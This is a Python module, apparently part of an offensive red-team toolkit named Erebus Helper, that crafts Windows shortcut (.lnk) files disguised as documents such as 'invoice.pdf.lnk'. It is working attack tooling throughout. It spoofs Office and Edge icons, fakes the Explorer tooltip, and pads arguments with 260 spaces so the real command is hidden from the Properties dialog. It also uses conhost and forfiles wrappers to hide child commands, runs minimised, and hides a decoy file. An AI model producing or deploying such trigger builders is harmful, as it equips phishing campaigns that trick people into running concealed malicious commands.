"""
LNK Trigger Creation Module for Erebus Helper.

Supports crafting Windows shortcut (.lnk) files with advanced evasion properties:

  - Environment variable paths in target and icon fields so the resolved path
    is not visible as a plain string inside the LNK binary.
  - Argument padding: prepend N space characters so command-line arguments
    overflow the visible area of any dialog that inspects the shortcut.
  - Search/replace post-processing: build arguments using a harmless placeholder
    character (e.g. '!') in place of '%' to prevent the shell from expanding
    environment variables during LNK creation, then swap back after the file is
    written.  This keeps env-var tokens intact inside the binary without being
    evaluated at build time.
  - Minimised window mode by default so no console window flashes on execution.
  - Mimic-as-file description preset: sets the tooltip description to a fake
    file-info block ("Type: Document  Size: X KB  Date modified: today") so the
    Explorer tooltip looks like a legitimate document shortcut.
  - Icon preset library aligned with common Office / Edge / Windows paths that
    use %PROGRAMFILES% / %WINDIR% environment variables, deferring resolution to
    the target host.
  - Graceful COM fallback: if pythoncom / win32com are available the shortcut is
    created natively (required when the icon path itself contains env vars);
    otherwise pylnk3 is used with an EnvironmentVariableDataBlock for target
    resolution only.

Reference: Windows Shortcut File format
  https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink
"""

import datetime
import os
import pathlib
import random
import stat
import sys
import logging

try:
    import pylnk3
except ImportError:
    pylnk3 = None

try:
    import pythoncom
    import win32com.client
    _COM_AVAILABLE = True
except ImportError:
    _COM_AVAILABLE = False

logger = logging.getLogger("ErebusHelper.LNK")

REPO_ROOT   = pathlib.Path(__file__).resolve().parents[2]
AGENT_CODE  = REPO_ROOT / "agent_code"
PAYLOAD_DIR = AGENT_CODE / "payload"
DECOY_FILE  = AGENT_CODE / "decoys" / "decoy.pdf"

# ---------------------------------------------------------------------------
# Icon preset library
# Paths use environment variables so no absolute drive letter leaks into the
# LNK binary.  Resolution happens on the target host at shortcut launch time.
# ---------------------------------------------------------------------------
ICON_ALIASES: dict[str, tuple[str, int]] = {
    # Microsoft Office - installer icon bundles
    "pdf":         (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe",  13),
    "word":        (r"%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\wordicon.exe",  0),
    "excel":       (r"%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\xlicons.exe",   0),
    "powerpoint":  (r"%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\pptico.exe",    0),
    "outlook":     (r"%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\outicon.exe",   0),
    "onenote":     (r"%PROGRAMFILES%\Microsoft Office\root\vfs\Windows\Installer\{90160000-000F-0000-1000-0000000FF1CE}\joticon.exe",   0),
    # Windows built-ins
    "folder":      (r"%WINDIR%\explorer.exe",            0),
    "document":    (r"%WINDIR%\System32\shell32.dll",    1),
    "notepad":     (r"%WINDIR%\notepad.exe",             0),
    "edge":        (r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe",   0),
    "paint":       (r"%WINDIR%\System32\mspaint.exe",    0),
    "generic":     (r"%WINDIR%\System32\shell32.dll",    0),
}

# LOLBin wrappers that hide a child command from casual inspection.
# Key = alias name, value = (binary_envvar_path, argument_prefix)
LOLBIN_WRAPPERS: dict[str, tuple[str, str]] = {
    "conhost":   (r"%WINDIR%\System32\conhost.exe",   "--headless"),
    "forfiles":  (r"%WINDIR%\System32\forfiles.exe",  "/p %WINDIR%\\System32 /m notepad.exe /c"),
}

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _mimic_description(file_type: str) -> str:
    """Return a fake file-info tooltip string that mimics Explorer's tooltip."""
    size_kb = f"{random.randint(1, 999)}.{random.randint(1, 99)}"
    date    = datetime.datetime.now().strftime("%Y-%m-%d")
    return f"Type: {file_type}\nSize: {size_kb} KB\nDate modified: {date}"


def set_file_hidden(file_path: str) -> None:
    """Mark a file hidden (Windows FILE_ATTRIBUTE_HIDDEN or restricted perms)."""
    try:
        p = pathlib.Path(file_path)
        if not p.exists():
            logger.warning("File does not exist: %s", file_path)
            return
        if sys.platform == "win32":
            import ctypes
            ctypes.windll.kernel32.SetFileAttributesW(str(file_path), 0x02)
        else:
            os.chmod(file_path, stat.S_IRUSR | stat.S_IWUSR)
    except Exception as exc:
        logger.error("Error setting file attributes on %s: %s", file_path, exc)


def get_icon_by_alias(alias: str) -> tuple[str, int]:
    """Resolve an icon alias to (path, index).  Falls back to 'generic'."""
    return ICON_ALIASES.get(alias.lower(), ICON_ALIASES["generic"])


# ---------------------------------------------------------------------------
# Core LNK construction
# ---------------------------------------------------------------------------

def _create_lnk_com(
    outfile:    str,
    target:     str,
    arguments:  str,
    icon_file:  str,
    icon_index: int,
    workdir:    str,
    description: str,
    window_mode: int,
) -> bool:
    """Create an LNK via WScript.Shell COM (required for env-var icon paths)."""
    wshell = None
    try:
        pythoncom.CoInitialize()
        wshell = win32com.client.DispatchEx("wscript.shell")
        scut = wshell.CreateShortcut(outfile)
        scut.TargetPath      = target
        scut.Arguments       = arguments
        scut.WindowStyle     = window_mode
        scut.WorkingDirectory = workdir
        scut.Description     = description
        if icon_file:
            scut.IconLocation = f"{icon_file},{icon_index}"
        scut.Save()
        return True
    except Exception as exc:
        logger.error("COM shortcut creation failed: %s", exc)
        return False
    finally:
        if wshell is not None:
            wshell = None
        try:
            pythoncom.CoUninitialize()
        except Exception:
            pass


def _create_lnk_pylnk3_envvar(
    outfile:    str,
    target:     str,
    arguments:  str,
    icon_file:  str,
    icon_index: int,
    workdir:    str,
    description: str,
    window_mode_str: str,
) -> bool:
    """
    Create an LNK via pylnk3 with EnvironmentVariableDataBlock for env-var
    target paths.  Icon env-var paths are NOT supported by pylnk3; icon is
    stored verbatim (the path with literal '%' chars) which still works when
    the icon DLL is in a standard location.
    """
    if pylnk3 is None:
        raise ImportError("pylnk3 is not installed: pip install pylnk3")

    lnk = pylnk3.Lnk()
    lnk.file = outfile
    lnk.link_flags.IsUnicode = True
    lnk.link_info = None

    env_block = pylnk3.ExtraData_EnvironmentVariableDataBlock()
    env_block.target_ansi    = target
    env_block.target_unicode = target
    lnk.link_flags.HasExpString      = True
    lnk.link_flags.PreferEnvironmentPath = True

    if arguments:
        lnk.link_flags.HasArguments = True
        lnk.arguments = arguments

    if workdir:
        lnk.link_flags.HasWorkingDir = True
        lnk.work_dir = workdir

    if description:
        lnk.link_flags.HasName = True
        lnk.description = description

    if icon_file:
        lnk.icon       = icon_file
        lnk.icon_index = icon_index
        lnk.link_flags.HasIconLocation = True

    lnk.window_mode = window_mode_str.capitalize()
    lnk.extra_data  = pylnk3.ExtraData(blocks=[env_block])
    lnk.save()
    return True


def _create_lnk_pylnk3_plain(
    outfile:    str,
    target:     str,
    arguments:  str,
    icon_file:  str,
    icon_index: int,
    workdir:    str,
    description: str,
    window_mode_str: str,
) -> bool:
    """Standard pylnk3.for_file path for targets without env vars."""
    if pylnk3 is None:
        raise ImportError("pylnk3 is not installed: pip install pylnk3")

    lnk = pylnk3.for_file(
        target_file  = target,
        lnk_name     = None,
        arguments    = arguments,
        description  = description,
        icon_file    = icon_file,
        icon_index   = icon_index,
        work_dir     = workdir,
        window_mode  = window_mode_str.capitalize(),
    )
    lnk.save(outfile)
    return True


def _postprocess_search_replace(lnk_path: str, search: str, replace: str) -> None:
    """
    Load the saved LNK, swap every occurrence of `search` with `replace` in
    the Arguments field, and save again.  Used to convert a placeholder
    character (e.g. '!') back to '%' so env-var tokens survive creation.
    """
    if pylnk3 is None:
        logger.warning("pylnk3 unavailable – search/replace skipped")
        return
    try:
        lnk = pylnk3.Lnk(lnk_path)
        args = lnk.arguments or ""
        if search in args:
            lnk.arguments = args.replace(search, replace)
            lnk.save()
            logger.debug("Search/replace applied: '%s' → '%s'", search, replace)
    except Exception as exc:
        logger.error("Search/replace post-processing failed: %s", exc)


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

# Window mode constants (mirrors IShellLinkA.SetShowCmd values)
WINDOW_MODE_NORMAL    = 1
WINDOW_MODE_MAXIMIZED = 3
WINDOW_MODE_MINIMIZED = 7

_WINDOW_MODE_MAP: dict[str, int] = {
    "normal":    WINDOW_MODE_NORMAL,
    "maximized": WINDOW_MODE_MAXIMIZED,
    "minimized": WINDOW_MODE_MINIMIZED,
}


def create_lnk_trigger(
    target_bin:     str,
    args:           str,
    icon_src:       str,
    icon_index:     int,
    description:    str,
    payload_dir:    pathlib.Path | None = None,
    output_filename: str = "invoice.pdf.lnk",
    window_mode:    str = "minimized",
    pad:            int = 0,
    search:         str = "",
    replace:        str = "",
    mimic_as_file:  str = "",
) -> pathlib.Path:
    """
    Create an LNK shortcut with advanced evasion properties.

    Parameters
    ----------
    target_bin      Binary to execute.  May contain %ENV_VAR% tokens.
    args            Command-line arguments for the binary.
    icon_src        Icon DLL / EXE path.  May contain %ENV_VAR% tokens.
    icon_index      Icon resource index inside icon_src.
    description     Tooltip description (overridden by mimic_as_file if set).
    payload_dir     Directory where the LNK will be written.
    output_filename Output file name.
    window_mode     "minimized" (default), "normal", or "maximized".
    pad             Number of leading space characters to prepend to args,
                    pushing the real command off the visible area in dialogs.
    search          Placeholder character in args to swap for `replace` after
                    the LNK is written (e.g. '!' → '%').
    replace         Character that replaces `search` in the post-processing
                    step.
    mimic_as_file   If non-empty, override description with a fake file-info
                    block: "Type: <value>\\nSize: X KB\\nDate modified: today".
    """
    if payload_dir is None:
        payload_dir = PAYLOAD_DIR
    payload_dir = pathlib.Path(payload_dir)
    payload_dir.mkdir(parents=True, exist_ok=True)

    outpath = str(payload_dir / output_filename)

    # Resolve window mode string to integer (for COM) and keep string for pylnk3
    wmode_str = window_mode.lower()
    wmode_int = _WINDOW_MODE_MAP.get(wmode_str, WINDOW_MODE_MINIMIZED)

    # Override description with mimic preset when requested
    if mimic_as_file:
        description = _mimic_description(mimic_as_file)

    # Pad arguments to overflow dialog controls
    padded_args = " " * pad + args if pad > 0 else args

    has_env_target = "%" in target_bin
    has_env_icon   = "%" in icon_src

    # --- Creation strategy -----------------------------------------------
    # Prefer COM when:
    #   a) COM is available (Windows + pywin32 installed), AND
    #   b) icon path contains env vars (pylnk3 cannot handle that correctly)
    # Fall back to pylnk3 env-var path for env-var targets without env-var icons.
    # Fall back to pylnk3 plain path for fully absolute targets.
    # ---------------------------------------------------------------------
    created = False

    if _COM_AVAILABLE and (has_env_icon or has_env_target):
        logger.info("Creating LNK via COM (env-var path detected)")
        created = _create_lnk_com(
            outfile     = outpath,
            target      = target_bin,
            arguments   = padded_args,
            icon_file   = icon_src,
            icon_index  = icon_index,
            workdir     = "",
            description = description,
            window_mode = wmode_int,
        )

    if not created and has_env_target:
        logger.info("Creating LNK via pylnk3 EnvironmentVariableDataBlock")
        _create_lnk_pylnk3_envvar(
            outfile          = outpath,
            target           = target_bin,
            arguments        = padded_args,
            icon_file        = icon_src,
            icon_index       = icon_index,
            workdir          = "",
            description      = description,
            window_mode_str  = wmode_str,
        )
        created = True

    if not created:
        logger.info("Creating LNK via pylnk3 (absolute target)")
        _create_lnk_pylnk3_plain(
            outfile          = outpath,
            target           = target_bin,
            arguments        = padded_args,
            icon_file        = icon_src,
            icon_index       = icon_index,
            workdir          = "",
            description      = description,
            window_mode_str  = wmode_str,
        )

    # Post-process: swap placeholder back to the real character
    if search and replace:
        _postprocess_search_replace(outpath, search, replace)

    lnk_path = pathlib.Path(outpath)
    logger.info("LNK created: %s", lnk_path)
    return lnk_path


def create_payload_trigger(
    target_bin:    str,
    args:          str,
    icon_src:      str,
    icon_index:    int,
    description:   str,
    payload_dir:   pathlib.Path | None = None,
    decoy_file:    pathlib.Path | None = None,
    output_filename: str = "invoice.pdf.lnk",
    window_mode:   str = "minimized",
    pad:           int = 260,
    search:        str = "!",
    replace:       str = "%",
    mimic_as_file: str = "Document",
) -> pathlib.Path:
    """
    Create an LNK trigger with advanced evasion and hide the decoy file.

    Default values are chosen for offensive engagements:
      - pad=260   pushes args past the visible area of the Properties dialog
      - search='!' / replace='%'  keeps env-var tokens alive in args without
        early shell expansion during LNK creation
      - window_mode='minimized'   suppresses any visible window
      - mimic_as_file='Document'  makes the tooltip look like a real file
    """
    if decoy_file is None:
        decoy_file = DECOY_FILE

    lnk_file = create_lnk_trigger(
        target_bin      = target_bin,
        args            = args,
        icon_src        = icon_src,
        icon_index      = icon_index,
        description     = description,
        payload_dir     = payload_dir,
        output_filename = output_filename,
        window_mode     = window_mode,
        pad             = pad,
        search          = search,
        replace         = replace,
        mimic_as_file   = mimic_as_file,
    )

    if decoy_file and pathlib.Path(decoy_file).exists():
        set_file_hidden(str(decoy_file))
        logger.info("Decoy file hidden: %s", decoy_file)

    return lnk_file


def create_lnk_with_alias(
    target_bin:     str,
    args:           str,
    icon_alias:     str,
    description:    str,
    payload_dir:    pathlib.Path | None = None,
    output_filename: str = "document.lnk",
    window_mode:    str = "minimized",
    pad:            int = 260,
    search:         str = "!",
    replace:        str = "%",
    mimic_as_file:  str = "Document",
) -> pathlib.Path:
    """Convenience wrapper that resolves icon_alias before calling create_lnk_trigger."""
    icon_src, icon_index = get_icon_by_alias(icon_alias)
    logger.info("Icon alias '%s' resolved to %s[%d]", icon_alias, icon_src, icon_index)
    return create_lnk_trigger(
        target_bin      = target_bin,
        args            = args,
        icon_src        = icon_src,
        icon_index      = icon_index,
        description     = description,
        payload_dir     = payload_dir,
        output_filename = output_filename,
        window_mode     = window_mode,
        pad             = pad,
        search          = search,
        replace         = replace,
        mimic_as_file   = mimic_as_file,
    )
